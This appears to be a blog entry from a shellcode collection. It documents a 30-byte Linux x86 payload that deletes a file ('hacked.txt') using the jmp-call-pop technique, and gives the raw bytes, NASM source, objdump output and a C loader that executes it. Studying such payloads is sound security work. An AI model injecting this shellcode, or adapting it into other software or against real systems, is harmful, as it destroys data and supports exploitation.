---
title:  Linux/86 Delete file -> Jmp-call-pop,XOR
date: 2022-06-03 05:49:33 +0800
categories: [Shellcodes, Linux]
tags: []  
---

# Info

Description: `Shellcode to delete a file.`

Platform: `Linux`

Arch: `x86`

Size: `30 bytes`

Technique: `jmp-call-pop`, `XOR`

Shellcode : `\xeb\x0d\x5b\x31\xc0\xb0\x0a\xcd\x80\x31\xdb\xb0\x01\xcd\x80\xe8\xee\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x2e\x74\x78\x74`

# Execution

![shellcode](https://raw.githubusercontent.com/cyberkhalid/cyberkhalid.github.io/main/assets/img/shellcodes/unlinkjmpcallpopxor.png)

# Assembly-nasm

`nasm -f elf32 -o shellcode.o shellcode.asm`

`ld -o shellcode shellcode.o`

```nasm


global _start

section .text

_start:
    
    jmp data

main_:
    pop ebx
   
   ;delete file
    xor eax, eax
    mov al, 0xa
    int 0x80

    ; exit
    xor ebx, ebx
    mov al, 0x1
    int 0x80

data:
    call main_
    filename: db "hacked.txt"
      

```
# objdump

`objdump -d ./shellcode -M intel`

```bash

./shellcode:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       eb 0d                   jmp    804806f <data>

08048062 <main_>:
 8048062:       5b                      pop    ebx
 8048063:       31 c0                   xor    eax,eax
 8048065:       b0 0a                   mov    al,0xa
 8048067:       cd 80                   int    0x80
 8048069:       31 db                   xor    ebx,ebx
 804806b:       b0 01                   mov    al,0x1
 804806d:       cd 80                   int    0x80

0804806f <data>:
 804806f:       e8 ee ff ff ff          call   8048062 <main_>

08048074 <filename>:
 8048074:       68 61 63 6b 65          push   0x656b6361
 8048079:       64 2e 74 78             fs cs je 80480f5 <filename+0x81>
 804807d:       74                      .byte 0x74

```

# C

`gcc -o shellcode shellcode.c`

```c

#include <string.h>
#include <stdio.h>

const char * shellcode = "\xeb\x0d\x5b\x31\xc0\xb0\x0a\xcd\x80\x31\xdb\xb0\x01\xcd\x80\xe8\xee\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x2e\x74\x78\x74";

int main(void){
        printf("Length: %d\n", strlen(shellcode));
        (*(void(*)())shellcode)();
        return 0;
}


```

